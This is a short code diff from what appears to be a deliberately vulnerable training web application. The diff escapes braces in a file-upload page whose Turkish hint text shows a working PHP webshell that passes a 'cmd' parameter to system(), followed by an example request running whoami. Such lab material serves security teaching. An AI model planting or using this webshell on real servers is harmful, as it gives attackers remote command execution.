@@ -868,9 +868,9 @@ def file_upload():
             <li>PHP webshell örneği:</li>
             <pre style="background: #333; color: #0f0; padding: 10px; overflow-x: auto;">
 &lt;?php
-if(isset($_GET['cmd'])) {
+if(isset($_GET['cmd'])) {{
     system($_GET['cmd']);
-}
+}}
 ?&gt;
             </pre>
             <li>Yükledikten sonra: <code>/vulnerable/download/shell.php?cmd=whoami</code></li>
